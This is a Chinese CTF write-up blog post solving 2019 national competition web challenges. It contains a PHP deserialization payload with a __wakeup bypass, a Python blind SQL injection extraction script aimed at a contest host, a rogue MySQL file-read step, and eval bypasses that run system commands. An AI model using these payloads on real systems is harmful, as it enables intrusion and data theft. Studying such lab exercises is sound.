<!DOCTYPE html>



  


<script type="text/javascript" color="122,122,255" opacity="0.5" zindex="-2" count="99" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>



<html class="theme-next muse use-motion" lang="zh-Hans">
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="CTF,">










<meta name="description" content="0x00 签到题操作过程：** 三个人面向摄像头，得到flag FLAG值：**flag{87e37d95-6a48-4463-aff8-b0dbd27d3b7d} WEB0x01 JustSoso操作内容：  根据提示，可能存在文件包含 尝试一下php://filter/convert.base64-encode/resource=index.php 打到源码 12345678910111213">
<meta name="keywords" content="CTF">
<meta property="og:type" content="article">
<meta property="og:title" content="2019国赛部分题目wp-by NEX">
<meta property="og:url" content="http://yoursite.com/2019/04/27/2019国赛部分题目WP---NEX的小老妹/index.html">
<meta property="og:site_name" content="Bling_Dog">
<meta property="og:description" content="0x00 签到题操作过程：** 三个人面向摄像头，得到flag FLAG值：**flag{87e37d95-6a48-4463-aff8-b0dbd27d3b7d} WEB0x01 JustSoso操作内容：  根据提示，可能存在文件包含 尝试一下php://filter/convert.base64-encode/resource=index.php 打到源码 12345678910111213">
<meta property="og:locale" content="zh-Hans">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-6ae5083ae6860803.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-1cb4709d69c9f8b0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-c878c52164342aea.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-679bd0a014bc2a18.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://uploader.shimo.im/f/ph9XJGQTtMkz8pLT.png!thumbnail">
<meta property="og:image" content="https://uploader.shimo.im/f/aWPfk3km2w4K1Ela.png!thumbnail">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-78b7175aeefede7e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-cbba75568e12ed83.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-eb8f1d39d53a2da2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-3068da5a25b4f5cc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-50a0b6dea2a34947.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-1ced7796ce4d969f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-a27bb89fdf698416.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-4c5f4e059f70998a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-82f959c14f88ac75.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-c65b8294bc99ec4a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://uploader.shimo.im/f/HiUYdgGadVE0hblM.png!thumbnail">
<meta property="og:image" content="https://uploader.shimo.im/f/Z7MYGePX9qUilIM0.png!thumbnail">
<meta property="og:image" content="https://uploader.shimo.im/f/kQj4xxVqndQyQR4M.png!thumbnail">
<meta property="og:image" content="https://uploader.shimo.im/f/HTKux8AL4e8qyuBT.png!thumbnail">
<meta property="og:image" content="https://uploader.shimo.im/f/h5lIWK3qBZEOF8bo.png!thumbnail">
<meta property="og:image" content="https://uploader.shimo.im/f/oWJ7h8ep3a0e8GXK.png!thumbnail">
<meta property="og:image" content="https://uploader.shimo.im/f/2gXkgFEkLxQ0qlFf.png!thumbnail">
<meta property="og:image" content="https://uploader.shimo.im/f/7VNlb6ORa3sfJ0Ft.png!thumbnail">
<meta property="og:image" content="https://uploader.shimo.im/f/xJCYOdYtM0UWdSxd.png!thumbnail">
<meta property="og:image" content="https://uploader.shimo.im/f/jyWQnCsjkj0jToRh.png!thumbnail">
<meta property="og:image" content="https://uploader.shimo.im/f/3jI4Fl5d8jQFpDjE.png!thumbnail">
<meta property="og:image" content="https://uploader.shimo.im/f/Y8VdDAnAEycDje8A.png!thumbnail">
<meta property="og:image" content="https://uploader.shimo.im/f/CphnP2byuCQYMYu4.png!thumbnail">
<meta property="og:image" content="https://uploader.shimo.im/f/zhm1uhtO7d4oyNGp.png!thumbnail">
<meta property="og:updated_time" content="2019-05-12T15:25:46.068Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="2019国赛部分题目wp-by NEX">
<meta name="twitter:description" content="0x00 签到题操作过程：** 三个人面向摄像头，得到flag FLAG值：**flag{87e37d95-6a48-4463-aff8-b0dbd27d3b7d} WEB0x01 JustSoso操作内容：  根据提示，可能存在文件包含 尝试一下php://filter/convert.base64-encode/resource=index.php 打到源码 12345678910111213">
<meta name="twitter:image" content="https://upload-images.jianshu.io/upload_images/11234137-6ae5083ae6860803.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Muse',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/2019/04/27/2019国赛部分题目WP---NEX的小老妹/">





  <title>2019国赛部分题目wp-by NEX | Bling_Dog</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Bling_Dog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle">奔向大佬路上的小白</p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br>
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br>
            
            归档
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br>
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br>
            
            关于
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br>
            
            分类
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/04/27/2019国赛部分题目WP---NEX的小老妹/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Bling_Dog">
      <meta itemprop="description" content>
      <meta itemprop="image" content="https://upload-images.jianshu.io/upload_images/11234137-b2b20e005c98464d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Bling_Dog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">2019国赛部分题目wp-by NEX</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-04-27T14:19:15+08:00">
                2019-04-27
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <h1 id="0x00-签到题"><a href="#0x00-签到题" class="headerlink" title="0x00 签到题"></a>0x00 签到题</h1><p><strong>操作过程：**</strong> <strong><br>三个人面向摄像头，得到flag
</strong>FLAG值：**<br>flag{87e37d95-6a48-4463-aff8-b0dbd27d3b7d}</p>
<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="0x01-JustSoso"><a href="#0x01-JustSoso" class="headerlink" title="0x01 JustSoso"></a>0x01 JustSoso</h2><p><strong>操作内容：  </strong><br>根据提示，可能存在文件包含 尝试一下php://filter/convert.base64-encode/resource=index.php 打到源码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line">index.php</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">$file = $_GET[&quot;file&quot;];</span><br><span class="line"></span><br><span class="line">$payload = $_GET[&quot;payload&quot;];</span><br><span class="line"></span><br><span class="line">if(!isset($file))&#123;</span><br><span class="line"></span><br><span class="line">echo &apos;Missing parameter&apos;.&apos;&lt;br&gt;&apos;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(preg_match(&quot;/flag/&quot;,$file))&#123;</span><br><span class="line"></span><br><span class="line">die(&apos;hack attacked!!!&apos;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@include($file);</span><br><span class="line"></span><br><span class="line">if(isset($payload))&#123;</span><br><span class="line"></span><br><span class="line">$url = parse_url($_SERVER[&apos;REQUEST_URI&apos;]);</span><br><span class="line"></span><br><span class="line">parse_str($url[&apos;query&apos;],$query);</span><br><span class="line"></span><br><span class="line">foreach($query as $value)&#123;</span><br><span class="line"></span><br><span class="line">if (preg_match(&quot;/flag/&quot;,$value)) &#123;</span><br><span class="line"></span><br><span class="line">die(&apos;stop hacking!&apos;);</span><br><span class="line"></span><br><span class="line">exit();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$payload = unserialize($payload);</span><br><span class="line"></span><br><span class="line">&#125;else&#123;</span><br><span class="line"></span><br><span class="line">echo &quot;Missing parameters&quot;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!--Please test index.php?file=xxx.php --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!--Please get the source of hint.php--&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br><span class="line">hint.php</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class Handle&#123;</span><br><span class="line"></span><br><span class="line">private $handle;</span><br><span class="line"></span><br><span class="line">public function __wakeup()&#123;</span><br><span class="line"></span><br><span class="line">foreach(get_object_vars($this) as $k =&gt; $v) &#123;</span><br><span class="line"></span><br><span class="line">$this-&gt;$k = null;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo &quot;Waking up\n&quot;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public function __construct($handle) &#123;</span><br><span class="line"></span><br><span class="line">$this-&gt;handle = $handle;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public function __destruct()&#123;</span><br><span class="line"></span><br><span class="line">$this-&gt;handle-&gt;getFlag();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Flag&#123;</span><br><span class="line"></span><br><span class="line">public $file;</span><br><span class="line"></span><br><span class="line">public $token;</span><br><span class="line"></span><br><span class="line">public $token_flag;</span><br><span class="line"></span><br><span class="line">function __construct($file)&#123;</span><br><span class="line"></span><br><span class="line">$this-&gt;file = $file;</span><br><span class="line"></span><br><span class="line">$this-&gt;token_flag = $this-&gt;token = md5(rand(1,10000));</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public function getFlag()&#123;</span><br><span class="line"></span><br><span class="line">$this-&gt;token_flag = md5(rand(1,10000));</span><br><span class="line"></span><br><span class="line">if($this-&gt;token === $this-&gt;token_flag)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">if(isset($this-&gt;file))&#123;</span><br><span class="line"></span><br><span class="line">echo @highlight_file($this-&gt;file,true);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>首先查看过滤 $url = parse_url($_SERVER[‘REQUEST_URI’]);<br>这里很有意思，用parse_url去处理URI，存在一个bug，可以用///绕过<br>参考<a href="http://www.am0s.com/functions/406.html" target="_blank" rel="noopener">http://www.am0s.com/functions/406.html</a><br>然后是反序列化<br>Handle class在析构的时候会调用handle的getFlag方法，所以可以传Flag class<br>然后需要绕过$this-&gt;token === $this-&gt;token_flag，尝试用引用绕过<br>Handle class 在__wakeup() 时会把参数清掉，也需要绕过，用<strong>CVE-2016-7124</strong>绕过即可<br>还有$handle 是private，需要加上%00，urlencode即可<br>生成序列化的php代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$f=new Flag(&quot;flag.php&quot;);</span><br><span class="line"></span><br><span class="line">$f-&gt;token=&amp;$f-&gt;token_flag;</span><br><span class="line"></span><br><span class="line">$a=new Handle($f);</span><br><span class="line"></span><br><span class="line">$as=serialize($a);</span><br><span class="line"></span><br><span class="line">echo urlencode($as).&quot;&lt;br&gt;&quot;;</span><br><span class="line"></span><br><span class="line">echo $as;</span><br></pre></td></tr></table></figure></p>
<p>payload:<br>///index.php?file=hint.php&amp;payload=O%3A6%3A”Handle”%3A2%3A%7Bs%3A14%3A”%00Handle%00handle”%3BO%3A4%3A”Flag”%3A3%3A%7Bs%3A4%3A”file”%3Bs%3A8%3A”flag.php”%3Bs%3A5%3A”token”%3Bs%3A32%3A”50abc3e730e36b387ca8e02c26dc0a22”%3Bs%3A10%3A”token_flag”%3BR%3A4%3B%7D%7D</p>
<p><strong>FLAG值：</strong><br>当时没有截图，此为结束后写wp重开环境得到的flag<br>flag{bdf9c526-1d57-4eb4-9ec7-d9198e2e987c}</p>
<hr>
<h2 id="0x02-最简单的sql注入"><a href="#0x02-最简单的sql注入" class="headerlink" title="0x02 最简单的sql注入"></a>0x02 最简单的sql注入</h2><p><strong>操作内容：</strong><br>sleep，or，if，|，BENCHMARK 被替换为QwQ，时间盲注基本不行，只能尝试布尔盲注，这里有一个点，pow(1,22222222) = 1，pow(0,2222222)会报错，根据页面回显就可以实现布尔盲注<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"> #coding=utf-8</span><br><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">exp = &quot;a&apos; and pow(((ascii(mid((select group_concat(b) from (select &apos;a&apos;,&apos;b&apos; union select * from user)a),&#123;1&#125;,1))=&#123;0&#125;)+1),222222222);#&quot;</span><br><span class="line">url = &quot;http://39.97.227.64:52105/&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">user = &apos;&apos;</span><br><span class="line">while True:</span><br><span class="line">    for j in range(10000):</span><br><span class="line">        print j</span><br><span class="line">        for i in string.digits+string.letters+&quot;!@#$%^&amp;*()_+-/=&#123;[&#125;]|,.`~&quot;:</span><br><span class="line">            expt = exp.format(ord(i),j)</span><br><span class="line">            #print expt</span><br><span class="line">            data = &#123;</span><br><span class="line">                &apos;username&apos; : expt,</span><br><span class="line">                &apos;password&apos; : &quot;passwd&quot;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            res = requests.post(url, data = data)</span><br><span class="line">            if &quot;操作&quot; in res.content:</span><br><span class="line">                if i==&quot;&apos;&quot;:</span><br><span class="line">                    continue</span><br><span class="line">                user = user + i</span><br><span class="line">                print user</span><br><span class="line">                break</span><br></pre></td></tr></table></figure></p>
<p>得到登陆密码： F1AG@1s-at_/fll1llag_h3r3<br><img src="https://upload-images.jianshu.io/upload_images/11234137-6ae5083ae6860803.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
<p>想到了DDCTF的mysql弱口令那个任意文件读取的题<br>参考一下<a href="https://www.anquanke.com/post/id/106488" target="_blank" rel="noopener">https://www</a><a href="https://www.anquanke.com/post/id/106488" target="_blank" rel="noopener">.</a><a href="https://www.anquanke.com/post/id/106488" target="_blank" rel="noopener">anquanke.</a><a href="https://www.anquanke.com/post/id/106488" target="_blank" rel="noopener">com/post/id/106488</a><br>用一下脚本：<a href="https://github.com/allyshka/Rogue-MySql-Server" target="_blank" rel="noopener">https://github.com/allys</a><a href="https://github.com/allyshka/Rogue-MySql-Server" target="_blank" rel="noopener">hka/Rogue-MySql-</a><a href="https://github.com/allyshka/Rogue-MySql-Server" target="_blank" rel="noopener">Server</a><br><img src="https://upload-images.jianshu.io/upload_images/11234137-1cb4709d69c9f8b0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
<p>改一下路径，然后查看路径就可以了<br><img src="https://upload-images.jianshu.io/upload_images/11234137-c878c52164342aea.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
<p><strong>FLAG值：</strong><br>flag{3f4abe8b-aa4a-bb48-c2f9f04d045beade}</p>
<hr>
<h2 id="0x03-Love-math"><a href="#0x03-Love-math" class="headerlink" title="0x03 Love math"></a>0x03 Love math</h2><p><strong>操作内容：</strong><br>查看源码，发现调用了calc.php，访问一下，可以看到源码<br><img src="https://upload-images.jianshu.io/upload_images/11234137-679bd0a014bc2a18.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
<p>最终有eval命令执行，大致思路就是绕过黑名单和利用白名单，执行命令<br>想到之前p神写过的不用字母数字写shell的博客，和先知上的骚操作<a href="https://xz.aliyun.com/t/3537" target="_blank" rel="noopener">https://xz.aliyun.com/t/3537</a><br>用base_convert去写命令<br>base_convert(1751504350,10,36)(base_convert(784,10,36))，(system(ls))发现有回显<br><img src="https://uploader.shimo.im/f/ph9XJGQTtMkz8pLT.png!thumbnail" alt="图片"><br>尝试读文件，发现无法绕过空格和长度限制，而且可以利用的点很少，只能利用白名单<br>可以把白名单内的函数名当作字符串来操作，爆破一下可以异或得到‘ *’</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">$list1=[&apos;abs&apos;, &apos;acos&apos;, &apos;acosh&apos;, &apos;asin&apos;, &apos;asinh&apos;, &apos;atan2&apos;, &apos;atan&apos;, &apos;atanh&apos;, &apos;base_convert&apos;, &apos;bindec&apos;, &apos;ceil&apos;, &apos;cos&apos;, &apos;cosh&apos;, &apos;decbin&apos;, &apos;dechex&apos;, &apos;decoct&apos;, &apos;deg2rad&apos;, &apos;exp&apos;, &apos;expm1&apos;, &apos;floor&apos;, &apos;fmod&apos;, &apos;getrandmax&apos;, &apos;hexdec&apos;, &apos;hypot&apos;, &apos;is_finite&apos;, &apos;is_infinite&apos;, &apos;is_nan&apos;, &apos;lcg_value&apos;, &apos;log10&apos;, &apos;log1p&apos;, &apos;log&apos;, &apos;max&apos;, &apos;min&apos;, &apos;mt_getrandmax&apos;, &apos;mt_rand&apos;, &apos;mt_srand&apos;, &apos;octdec&apos;, &apos;pi&apos;, &apos;pow&apos;, &apos;rad2deg&apos;, &apos;rand&apos;, &apos;round&apos;, &apos;sin&apos;, &apos;sinh&apos;, &apos;sqrt&apos;, &apos;srand&apos;, &apos;tan&apos;, &apos;tanh&apos;];</span><br><span class="line"></span><br><span class="line">$list2=[&apos;abs&apos;, &apos;acos&apos;, &apos;acosh&apos;, &apos;asin&apos;, &apos;asinh&apos;, &apos;atan2&apos;, &apos;atan&apos;, &apos;atanh&apos;, &apos;base_convert&apos;, &apos;bindec&apos;, &apos;ceil&apos;, &apos;cos&apos;, &apos;cosh&apos;, &apos;decbin&apos;, &apos;dechex&apos;, &apos;decoct&apos;, &apos;deg2rad&apos;, &apos;exp&apos;, &apos;expm1&apos;, &apos;floor&apos;, &apos;fmod&apos;, &apos;getrandmax&apos;, &apos;hexdec&apos;, &apos;hypot&apos;, &apos;is_finite&apos;, &apos;is_infinite&apos;, &apos;is_nan&apos;, &apos;lcg_value&apos;, &apos;log10&apos;, &apos;log1p&apos;, &apos;log&apos;, &apos;max&apos;, &apos;min&apos;, &apos;mt_getrandmax&apos;, &apos;mt_rand&apos;, &apos;mt_srand&apos;, &apos;octdec&apos;, &apos;pi&apos;, &apos;pow&apos;, &apos;rad2deg&apos;, &apos;rand&apos;, &apos;round&apos;, &apos;sin&apos;, &apos;sinh&apos;, &apos;sqrt&apos;, &apos;srand&apos;, &apos;tan&apos;, &apos;tanh&apos;];</span><br><span class="line"></span><br><span class="line">for ($x=0; $x&lt;=count($list1); $x++) &#123;</span><br><span class="line"></span><br><span class="line">for ($y=0; $y&lt;=count($list2); $y++)&#123;</span><br><span class="line"></span><br><span class="line">for ($z=0; $z&lt;=20; $z++)&#123;</span><br><span class="line"></span><br><span class="line">$c = (dechex($z)^$list1[$x]^$list2[$y]);</span><br><span class="line"></span><br><span class="line">  if($c == &quot; *&quot;)&#123;</span><br><span class="line"></span><br><span class="line">  echo $list1[$x].&quot; &quot;.$list2[$y].&quot; &quot;.$z;</span><br><span class="line"></span><br><span class="line">  echo &quot;&lt;br&gt;&quot;;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>得到了atan^pow^dechex(17)=’ *’<br>可以构造最终读文件的payload<br>base_convert(1751504350,10,36)(base_convert(15941,10,36).(atan^pow^dechex(17)))<br>然后读一下源码就可以了<br><img src="https://uploader.shimo.im/f/aWPfk3km2w4K1Ela.png!thumbnail" alt="图片"><br><strong>FLAG值：</strong><br>flag{652bc92a-ea94-443f-98ee-2cab5c3c90b8}</p>
